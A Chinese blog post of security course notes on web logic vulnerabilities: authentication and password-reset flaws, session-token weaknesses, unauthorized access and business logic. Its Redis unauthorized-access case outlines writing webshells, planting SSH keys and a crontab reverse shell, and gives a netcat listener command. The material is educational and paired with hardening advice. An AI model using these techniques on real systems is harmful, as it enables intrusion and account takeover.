href="#%E8%B5%84-%E4%BA%A7-%E6%A2%B3-%E7%90%86"><span class="nav-number">6.3.</span> <span class="nav-text">资 产 梳 理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F-%E6%B4%9E-%E6%89%AB-%E6%8F%8F"><span class="nav-number">6.4.</span> <span class="nav-text">漏 洞 扫 描</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8A%A0%E5%9B%BA"><span class="nav-number">7.</span> <span class="nav-text">系统及中间件加固</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA"><span class="nav-number">7.1.</span> <span class="nav-text">windows 主机加固</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E4%B8%BB%E6%9C%BA%E5%8A%A0%E5%9B%BA"><span class="nav-number">7.2.</span> <span class="nav-text">linux主机加固</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD-%E9%97%B4-%E4%BB%B6-%E5%8A%A0-%E5%9B%BA"><span class="nav-number">7.3.</span> <span class="nav-text">中 间 件 加 固</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0-%E6%8D%AE-%E5%BA%93-%E5%8A%A0-%E5%9B%BA"><span class="nav-number">7.4.</span> <span class="nav-text">数 据 库 加 固</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">8.</span> <span class="nav-text">应急响应</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-%E5%BA%94%E6%80%A5"><span class="nav-number">8.1.</span> <span class="nav-text">Windows 应急</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E5%BA%94%E6%80%A5"><span class="nav-number">8.2.</span> <span class="nav-text">Linux 应急</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebShell-%E5%BA%94%E6%80%A5"><span class="nav-number">8.3.</span> <span class="nav-text">WebShell 应急</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6"><span class="nav-number">8.4.</span> <span class="nav-text">常见代理软件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A5%E5%BF%97-amp-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">9.</span> <span class="nav-text">日志&amp;流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">9.1.</span> <span class="nav-text">Linux日志分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">9.2.</span> <span class="nav-text">Windows日志分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">9.3.</span> <span class="nav-text">Web日志分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">9.4.</span> <span class="nav-text">流量分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E8%A7%81pdf"><span class="nav-number">10.</span> <span class="nav-text">安全设备见pdf</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CJ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/01/HW%E8%AF%BE%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HW课程
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-01 14:04:25" itemprop="dateCreated datePublished" datetime="2022-07-01T14:04:25+08:00">2022-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-08-02 22:07:54" itemprop="dateModified" datetime="2022-08-02T22:07:54+08:00">2022-08-02</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>154k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>2:20</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="逻辑漏洞概述"><a href="#逻辑漏洞概述" class="headerlink" title="逻辑漏洞概述"></a>逻辑漏洞概述</h2><p><strong>前置知识点：</strong></p>
<p><strong>访问控制</strong>：在某种程度上来说，信息安全就是通过控制如何访问信息资源来防范资源泄露或未经授权修改的工作。<strong>访问控制(Access Control) 指系统对用户身份及其所属的预先定义的策略组限制其使用数据资源能力的手段</strong>。通常用于系统管理员控制用户对服务器、目录文件等网络资源的访问。访问控制是系统保密性，完整性、可用性和合法使用性的重要基础，是网络安全防范和资源保护的关键策略之一。也是主体依据某些控制策略或权限对客体本身或其资源进行的不同授权访问。</p>
<p>访问是主体(Subject) 和客体(Object) 之间的信息流动，访问控制的主要目的是限制访问主体对客体的访问，从而保障数据资源在合法范围内得以有效使用和管理。为了达到上述目的，访问控制需要完成两个任务:识别和确认访问系统的用户，决定该用户可以对某一系统资源进行何种类型的访问。</p>
<p>访问控制包含三个要素，即主体、客体和访问控制策略。<br>主体(Subject) 是指访问中一个发出请求或要求的主动实体， 可以是某个用户，也可以是用户启动的程序。进程或设备等;<br>客体(Object) 是接受其他实体访问的被动实体，凡是可以被操作的信息资源对象都可以被看作客体，可以是文件、光盘、数据库等。<br>控制策略( Attribution )是主体对客体的访问规则集，限制主体对客体的访问权限。</p>
<p>主体访问客体通常需要4个步骤:<br>➢Identification –身份标识<br>➢Authentication –身份验证<br>➢Authorization –授权<br>➢Accountability –审计</p>
<p>访问控制模型是规定主体如何访问客体的一种架构，目前主要分为三种:<br>➢自主访问控制(Discretionary Access Control, DAC, 大部分使用)<br>➢强制访问控制(Mandatory Access Control, MAC)<br>➢角色型访问控制(Role- Based Access Control, RBAC)</p>
<p>■什么是逻辑漏洞<br>随着网络安全法的实施、企业和用户安全意识的提高，Web安全已经成为了重点关注的方向，诸如使用安全开发框架，部署安全防护设备等防护手段的使用，使得网站的常规漏洞越来越少。以SQL注入为例，由于其危害巨大，常年稳居OWASP Top 10的第一位， 目前很多Web开发框架在底层就直接杜绝的SQL注入问题。但“逻辑漏洞”一词现在却更加热门。很可能成为Web漏洞的主战场。之所以称之为“逻辑漏洞”。是因为在代码之后是人的逻辑，人更容易犯错，是编写完程序后随着人的思维理解产生的不足， 所以逻辑漏洞一直都在。相比SQL注入、XSS漏洞等传统安全漏洞，SQL注入、 XSS等漏洞可以通过安全框架等避免，并且攻击流量非法，对原始程序进行了破坏，防火墙可以检测；所以现在的攻击者更倾向于利用业务逻辑层的应用安全问题，逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破环业务的完整性。一般出现在密码修改(没有旧密码验证)、越权访问、密码找回，交易支付等功能处。而且由于逻辑漏洞产生的流量多数为合法流量，传统的安全防御设备和措施收效甚微，一般的防护手段或设备无法阻止， 这类问题往往危害巨大，可能造成了企业的资产损失和名誉受损，所以导致了逻辑漏洞成为了企业防护中的难题。</p>
<p>■逻辑洞的分类<br>➢验证机制缺陷<br>➢会话管理缺陷<br>➢权限管理缺陷<br>➢业务逻辑缺陷</p>
<h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a><strong>验证机制</strong></h2><p>在网络中，身份是区别于其他个体的一种标识，为了与其他个体有所区别，身份必须具有唯一性。 网络中，身份不仅仅用于标识一个人，也可以用于标识一个机器，一个物体，甚至一个虚拟的东西(如进程、会话过程等) 。网络中的认证不是对某个事物的资质审查，而是对事物真实性的确认。身份认证的目的是鉴别通信中另一端的真实身份，防止伪造和假冒等情况发生。</p>
<p>根据身份认证的对象不同，认证手段也不同，但针对每种身份的认证都有很多种不同的方法。如果被认证的对象是人，则有三类信息可以用于认证:<br>➢Who knows：某人所知道的内容，这类信息通常理解为口令<br>➢Who has:某人所拥有的物品。这类信息包括密码本、密码卡、U盾<br>➢Who is:某人的身份，这类信息包括指纹、虹膜、脸型、语音特征等</p>
<p>一般情况下， 对人的认证只需要一种类型的信息即可， 如口令(常用于登录网站)、指纹(常用于登录电脑和门禁设备)、U盾(常用于网络金融业务)，而用户的身份信息就是该用户的账户名。</p>
<p>如果被认证的对象是一般的设备，则通常使用“挑战-应答”机制，即认证者发起一个挑战，被认证者进行应答，认证者对应答进行检验，如果符合要求，则通过认证，否则拒绝。验证机制是信息系统安全机制中最简单、最前沿的一种机制。最常见的方式是信息系统要求用户提交用户名与密码，正确则允许用户登录，错误即拒绝用户登录。</p>
<p><strong>验证机制设计缺陷</strong></p>
<p>■可预测的用户名<br>有些应用程序需要用户注册时用户名符合某一特定规则， 比如需要满足“姓名缩写_数字”的这种形式，其中数字是为了防止用户名重复，也就是说如果在存在姓名缩写相同的情况下后面要跟数字或者进行数字累加。这种在学校邮箱注册时是比较常见的。通过这种方式攻击者可以很方便的获得大量有效用户名。</p>
<p> ■非唯一性用户名<br>极少部分的应用程序不要求用户名的唯一性，这就可能造成这样的问题:在恰巧有两名用户使用相同的用户名及密码的情况下，应用程序要么阻止第二个用户设置密码， 要么允许其设置相同的密码。前者这种情况可能导致第一名用户的密码泄露给第二名用户，这种情况下攻击者如果想获得某个已知用户名对应的密码则可以通过注册功能针对于此用户名使用不同的密码注册，如果应用程序返回禁止注册，那么我们可以推测出此次注册时的密码就是这个用户名对应的密码。后者则可能导致第二名用户可以访问第一名用户的状态。</p>
<p>■弱口令.<br>弱口令(Weak Password)指容易被他人猜到的口令，除123456、 12345678、admin等常见口令外，生日、姓名、手机号、1qaz@WSX也被称为弱口令。为节省攻击成本，通常会适用弱口令字典进行字典攻击</p>
<p>■密码确认不完善</p>
<p>一些应用程序在用户注册设置密码时，出于一些原因往往会对密码进行如下处理:<br>➢截断前n个字符<br>➢大小写不敏感<br>➢删除特殊字符<br>上述操作均会减少应用程序的密码空间，攻击者通过仔细分析应用程序的密码处理规则后，可以适当修改自己的暴破字典从而提高暴破的成功率。</p>
<p>■可预测的密码<br>在像学校，企业这种存在批量注册大量用户需求的应用程序中，经常会为批量用户设置默认密码，这种默认密码可以是相同的也可以是与用户名或者其身份证信息等有关系的，这种情况下攻击者可以通过Google hacking来在公开信息汇总收集大量初始密码，也可以根据默认密码规律推测出大量密码。</p>
<p>  ■暴力破解<br>暴力破解_ (Brute Force)。也可称为蛮力攻击，指利用穷举法将所有的可能性一一尝试， 理论上可以破解所有密码问题。实际测试中，考虑到攻击成本问题，通常使用字典攻击(Dictinary Atack)，即逐一尝试用户自定义词典中的可能密码(单词或短语)的攻击方式。对于暴力破解，还有一些多余的提示信息可以利用。 比如登录失败后，提示“用户名不存在” 、“密码错误”、 “用户未注册” 等提示信息，通过这些信息可以更加快速的推断出用户名及密码。如果应用程序允许用户在登录失败很多次后。仍能继续尝试登录，那么这种情况下此应用可能存在暴破攻击。为了防止暴破攻击，应用程序应该设置用户登录失败次数上限，当用户失败的登录次数达到上限后应用程序应该阻止用户进一步的登录。但是通过前端脚本或者Cookie来统计用户失败的登录次数是不可靠的，因为这些都是攻击者可以接触到并且可以修改的，如果服务器端使用Session来存储用户失败登录的次数这样就可靠的多。除了用户登录次数的统计问题外，如何处理失败登录次数达到上限的用户也是一个需要谨慎处理的问题，如果用户在登录失败很多次后被锁定，但是锁定状态下的用户使用正确密码登录时和使用错误密码登录时Web应用程序的响应信息不同那么此时此应用还是存在暴破漏洞，</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706160755467.png" alt="image-20220706160755467"></p>
<p>■可利用信息<br>➢多余的提示信息<br>登录失败后，不应该提示如“用户不存在”、”密码错误”、“用户未注册”等详细信息，通过这些信息可推断出用户名、密码等其他信息<br>➢可预测信息<br>●类似user100、user101的用户名， 手机号信息<br>●类似于ABC123、123456的初始密码</p>
<p>在暴力破解的时候，若拥有验证码还需要绕过验证码，验证码常见的有图片验证码和短信验证码。<br>➢图片验证码<br>验证码不生效/不更新/不失效<br>验证码可预测/删除/获取<br>验证码可识别<br>➢短信验证码<br>●4/6位验证码<br>●篡改手机号<br>●篡改Response</p>
<p>■密码重置<br>在逻辑漏洞中密码重置问题是比较常见的一种场景，常见于用户修改密码页面、用户找回密码页面等涉及到网站重置密码功能的页面。<br>➢修改密码<br>目前的修改密码的方式大概可以分为两种，第一种是要求用户键入用户名、旧密码、新密码、确认新密码四部分，一些Web应用程序会忽略修改密码处旧密码错误输入次数过多的问题，这就容易被攻击者利用来进行密码暴破;还有一种最不安全的情况就是只需要用户键入用户名、新密码、确认新密码即可更改用户名相应的密码，这种情况下攻击者无需暴破即可获得正确的用户名及密码组合。</p>
<p>➢找回密码<br>●忘记密码功能往往通过设置一组问题来验证用户身份。比如这些问题可以是“我最喜欢的颜色”，这些问题的答案组合次数相对于密码来说小的多，并且可以通过信息收集工作来提供辅助。攻击者可以收集一组用户名并逐个遍历然后记录相应的问题在其中选择最简单的那个下手可以获得更高的成功率<br>●忘记密码处可能不会设置错误次数限制从而允许攻击者猜测上述问题的答案<br>●通常Web应用程序也会设置密码暗示来代替上述问题，这些密码暗示往往能够辅助攻击者猜测密码，有些用户甚至直接把密码设置为密码暗示。攻击者同样可以通过枚举收集到的用户名然后获得一组密码暗示， 从而寻找出最容易获得的密码</p>
<p>●当前Web应用程序可能通过向用户邮箱发送密码重置链接来帮助用户修改密码，这种链接是随机的攻击者很难对其进行猜解。但是有些应用在设计这个逻辑时可能允许Web应用程序将用户密码修复的邮件发送至攻击者，有时邮箱地址并没有直接显示出来而是存储在隐藏的表单中这时攻击者可以将邮箱修改为自己的邮箱。在最差的情况下攻击者可以尝试推测密码重置的URL来重置用户密码</p>
<p>■常见密码重置问题<br>➢用户名枚举:网站反馈多余信息，可猜测用户信息（用户不存在）<br>➢验证码返回前端处理:可截获、修改（bp）<br>➢修改Request:用户名、手机号。Cookie等信息可修改<br>➢修改Response:操作结果成功失败可修改<br>➢暴力破解验证码:验证码长度有限，或验证码未设置可靠的失效时间<br>➢拼凑密码重置链接:重置密码链接有规可循</p>
<p>■记住密码<br>一些应用程序为了方便用户访问通常会提供“记住密码”的功能，此功能通常仅通过cookie中的某个字段来实现。比如Cookie中会设置一个存储用户名的字段来实现基础的功能，如果这样的话攻击者仅需要随便注册个用户然后将Cookie中用户名修改为其想要访问用户的用户名即可实现对目标用户的访问。Cookie中还可能通过存储一个ID字段来唯一的标识用户，这种情况下攻击者可以遍历ID从而实现遍历访问用户。</p>
<h2 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a><strong>会话管理</strong></h2><p>在人机交互时，会话管理是保持用户的整个会话活动的互动与计算机系统跟踪过程。会话管理分类:桌面会话管理、浏览器会话管理、Web服务器的会话管理。桌面会话管理器是一个程序，可以保存和恢复桌面会话，桌面会话是所有正在运行的窗口和当前的内容。受会话管理的应用程序，在保存会话的设置时，会话管理器会保存受该会话管理的所有应用程序。如果注销后再次登录，会话管理器会自动启动<br>受该会话管理的应用程序；不受会话管理的应用程序，必须手动启动这些应用程序。浏览器会话管理是打开网页浏克器时，用户可以保存所有打开的网页和设定，并在以后恢复他们的日期。为了帮助恢复系统或应用软件崩溃，页面和设置也可以在下次运行恢复。</p>
<p>HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。 它也可以简单理解为一个用户从登录到退出应用的一段期间。<br>常见的Web应用会话管理的方式有以下3种:<br>基于server端session的管理方式<br>cookie based的管理方式<br>token-based的管理方式</p>
<p>HTTP协议</p>
<p>➢无连接<br>●每次连接只处理一个请求。服务器处理完客户的请求，井收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。<br>➢无状态<br>●指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送HTTP请求之后，服务器根据请求，会给我们发送数据过来，但是发送完，不会记录任何信息。<br>➢会话<br>●执行会话最简单、最常见的方式是向每名用户发布一个唯一的会话令牌或标识符，用户在每一个请求中提交这个令牌。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706170145312.png" alt="image-20220706170145312"></p>
<p>■如何攻击会话管理机制<br>    ■确定会话令牌<br>➢多个数据共同表示一个会话令牌，包括Cookie、URL参数以及隐藏的表单参数<br>➢标准的会话Cookie可能存在但是Web应用程序未对其进行使用<br>➢观察用户登录前后客户端保存数据的变化，这些变化中包含了建立新会话的令牌<br>➢通过删除客户端向服务器端发送的参数来进行判断，比如在删除了某个参数后无法正常访问用户的个人资料，那么这个参数应该与会话令牌有关</p>
<p>■令牌使用情景<br>➢发送到用户注册邮箱的密码恢复令牌<br>➢防止CSRF的会话令牌<br>➢用于一次性访问受保护资源的令牌<br>➢未使用验证的购物应用程序的消费者用于检索现有订单状态的令牌</p>
<p>■令牌有含义<br>我们常规抓取http数据包所观察到的令牌内容多是杂乱无序的字符串，不同用户之间的令牌也无任何规律。但是也不排除有些系统会有意设置具有含义的令牌字符，如:<br>➢用户名称:如user、admin、 system<br>➢用户标识:如0001、0002、 0003<br>➢用户权限: admin、00101、 01000<br>➢用户姓/名: zhangsan<br>➢日期/时间戳<br>➢电子邮箱<br>➢可预测数字</p>
<p>■令牌可预测<br>隐含序列:有时我们并不能直接的通过观察令牌来发现其隐含的序列或者规律，我们可以通过对令牌进行解码，然后发挥想象力通过各种运算或者操作来发现解密后令牌中所蕴含的规律或者隐含的序列。<br>时间依赖: 一些Web服务器和应用程序使用时间来参与令牌的生成。如果使用时间生成令牌的算法没有合并足够的熵，攻击者就可能推测出其他用    户的令牌。生成数字的随机性不强:计算机生成的随机数都是伪随机数，如果伪随机数的算法强度较弱，那么生成随机数很可能被预测，令牌加密函数对外开放或暴露:如果攻击者可以接触到会话令牌生成函数的源码、算法过程或者相应加密过程的入口(即攻击者可以通过此入口获得任何数据经过和令牌相同的加密方式后的数据) .那么攻击者就可以详细的了解令牌生成的过程，从而模仿此过程对令牌进行伪造。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706171032986.png" alt="image-20220706171032986"></p>
<p>sessionID是无序字符串</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706171222206.png" alt="image-20220706171222206"></p>
<p>■在网络上泄露令牌<br>➢应用程序在登录阶段那使用HTTPS，但是登录成功后转为使用HTTP或者可以访问验证前使用HTTP的链接，这样尽管保护了用户的证书，却保护不了用户的会话令牌<br>➢用户在首次访问某一网站时使用HTTP协议， 往往此时服务器已经给客户端发布了会话令牌，当用户进行登录时，即使网站转换使用HTTPS，那么在令牌不改变的情况下，原先处于暴露环境中的令牌此刻升级为具有通过验证的令牌<br>➢如果登录界面允许使用HTTP协议登录，那么攻击者可以通过各种方式使用户在登录时使用HTTP协议<br>➢在用户使用HTTPS协议登录后，如果网页在加载像图片等静态资源时使用的是HTTP协议，用户的会话令牌还是可以通过此泄露</p>
<p>■在日志中泄露令牌<br>➢协助网络管理人员的系统日志如果记录了最近的会话日志，且未对访问控制进行严格管理，那么在此种情况下，攻击者可能通过日志获得登录会话<br>➢如果应用程序将会话置于URL中，那么这些会话会被记录在:<br>●用户浏览器的日志中<br>●Web服务器日志<br>●企业或ISP代理服务器日志<br>●反向代理服务器日志<br>●任何站外服务器的Referer (最危险的方式)</p>
<p>■会话令牌与会话的映射易受到攻击<br>➢允许并行登录<br>➢使用静态令牌，即一个用户令牌发布后不再改变</p>
<p>■客户端暴露在令牌劫持风险中<br>网站存在如下攻击，容易造成会话令牌被劫持<br>➢XSS  ➢CSRF  ➢会话固定<br>●认证前就发布令牌<br>●认证后获得的会话令牌可重新用于其他用户认证<br>●应用程序接受伪造令牌</p>
<p>■令牌有效期过长<br>➢是否需要在一段时间后使令牌失效<br>➢是否需要在关闭刘览器时使令牌失效<br>■令牌尝试次数过多<br>➢可以考虑在令牌提交次数过多时候使令牌失效<br>■无效的令牌重置的手段<br>➢注销后令牌是否还有效</p>
<p>会话管理问题<br>cookie的属性值expires,就是用于设置cookie过期时间，如果设置<br>一个时间，到期后cookie则失效，如果默认不设置，则为浏览器关闭后cookie失效。令牌的有效时间设置比较重要，时间设置过短，用户还没有访问完就要重新登录，时间设置过长会存在安全问题。令牌失效时间过长，当用户结束访问网站后，令牌仍然有效，那么攻击者劫持成功令牌的概率就会增加。用户注销后，令牌是否有设置失效，如没有该逻辑，那么注销后的令牌仍然合法，攻击者依旧可以以用户身份登录。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706172050633.png" alt="image-20220706172050633"></p>
<h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a><strong>权限控制</strong></h2><p>◼ 权限管理（Authorization）<br>权限管理，一般指根据系统设置的安全规则或者安全策略，用户可以访问而且只能访问自己被授权的资源，不多不少。权限管理几乎出现在任何系统里面，只要有用户和密码的系统。很多人常将“用户身份认证”、“密码加密”、“系统管理”等概念与权限管理概念混淆。用户身份认证是用户要告诉系统“我是谁”，不属于权限管理范畴。密码加密，隶属用户身份认证领域，不属于权限管理范畴。系统管理，一般是系统的一个模块。而且该模块一般还含有权限管理子模块。系统管理里面的权限管理模块，只是一个操作界面，让管理员能够设置角色等安全策略。系统背后还有很多权限验证逻辑，这些都并不属于该模块。总体来说，该模块相当于给权限管理模块提供了一些数据。</p>
<p>■权限管理(Authorization)<br>➢从控制力度来看,可以将权限管理分为两大类:<br>●功能级权限管理<br>●数据级权限管理<br>➢从控制方向来看，也可以将权限管理分为两大类:<br>●从系统获取数据，比如查询订单、查询客户资料<br>●向系统提交数据，比如删除订单、修改客户资料</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706194220707.png" alt="image-20220706194220707"></p>
<p>■权限控制<br>关于权限控制，一般有以下问题:    ➢未授权访问   ➢越权访问</p>
<p><strong>未授权访问</strong><br>当信息系统的安全配置或权限认证的地址，授权页面存在缺陷时，有可能出现未授权访问，导致用户可以访问信息系统，进而操作重要权限、操作数据库、读取网站目录等敏感信息。目前存在未授权访问漏洞主要存在Web应用权限中。正常情况下，管理后台的页面应该只有管理员才能够访问，而且搜索引擎的爬虫也不应该搜索到这些页面，但这些系统未对用户访问权限进行控制，导致任意用户只要构造出了正确URL就能够访问这些页面或者用爬虫爬到页面目录。对于Web应用程序，未授权访问常发生于空口令登录及后台管理页面的访问。空口令多是因为配置问题，允许不输入用户名密码登录，修改配置可避免。后台管理页面应该只有管理员才能访问，正常情况下是不应该被前台访问到的，搜索引擎与爬虫也不应搜索到后台页面，由于系统未对用户访问权限做控制，可能被攻击者用工具或手动尝试出来。</p>
<p>对于数据库或一些服务组件，未授权访问可能由于一些版本中出现的漏洞，导致攻击者能读取数据库信息，读取系统的文件，甚至利用服务写文件至主机上。<br>目前主要存在未授权访问漏洞的服务有：<br>samba服务、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ElasticSearch、Memcache、docker等</p>
<p>◼ 案例：Redis未授权访问<br>Redis是完全开源免费的，遵守BSD协议，是一个高性能的key-value存储系统，是跨平台的非关系型数据库。Redis通常被称为数据结构服务器，因为值（value）可以是字符串、哈希、列表、集合和有序集合等类型，与其他key-value缓存产品有以下三个特点：<br>➢ Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用<br>➢ Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储<br>➢ Redis支持数据的备份，即master-slave模式的数据备份。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706203831675.png" alt="image-20220706203831675"></p>
<p>扫描/连接默认的6379端口<br>➢ 利用方式：<br>● 直接读取数据库中的数据<br>● 向Web目录中写shell：需要猜到Web目录地址<br>● 写ssh-keygen公钥然后使用私钥登陆<br>● 利用crontab反弹shell<br>● 向Web目录中写shell：需要猜到Web目录地址<br>可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save，就可以写入一个路径为a/b的任意文件（需要有Web服务且有写入权限）：<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195353717.png" alt="image-20220706195353717"></p>
<p>● 写ssh-keygen公钥然后使用私钥登陆<br>3、利用私钥成功登录redis服务器</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195540912.png" alt="image-20220706195540912"></p>
<p>● 利用crontab反弹shell<br>连接redis，向crontab中写计划任务，并反弹shell，需要root权限</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195612952.png" alt="image-20220706195612952"></p>
<p>在攻击机上启动nc监听5555端口（未被占用的任意端口），等待反弹shell<br>nc –lvnp 5555<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195644583.png" alt="image-20220706195644583"></p>
<p>◼ Redis未授权访问防御方法</p>
<p>➢ 可以配置redis.conf文件，在redis安装目录下<br>● 默认只对本地开放bind 127.0.0.1<br>● 添加登陆密码：修改redis.conf文件，添加requirepass password<br>● 在需要对外开放的时候修改默认端口（端口不重复就行）port 2333<br>● 配合iptables限制开放<br>● 降权：以低权限运行 Redis 服务（重启redis才能生效）<br>● 禁止使用root权限启动redis服务</p>
<p>◼ 防御解决方案<br>➢ 隐藏：只能阻止用户无法猜测到后台界面，爆破工具可以扫描大量后台地址<br>➢ 页面权限控制：可以阻挡非认证用户登录后台，即使找到后台链接，也会被认证窗口阻挡</p>
<h2 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h2><p>◼ 业务逻辑<br>业务逻辑广义的认知应该是：软件产品都是在某个领域内实现某些特定业务，所以，软件产品天生应该分解为界面交互部分和业务逻辑部分，其中业务逻辑部分是软件产品的核心，它客观存在于软件产品内部，但是无法对使用者产生直观刺激，因此业务逻辑不能与使用者直接交互。而界面交互部分是业务逻辑与使用者进行交流的接口，使用者通过界面交互部分，与业务进行交流，从而使得软件产品发挥其作用。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706204846203.png" alt="image-20220706204846203"></p>
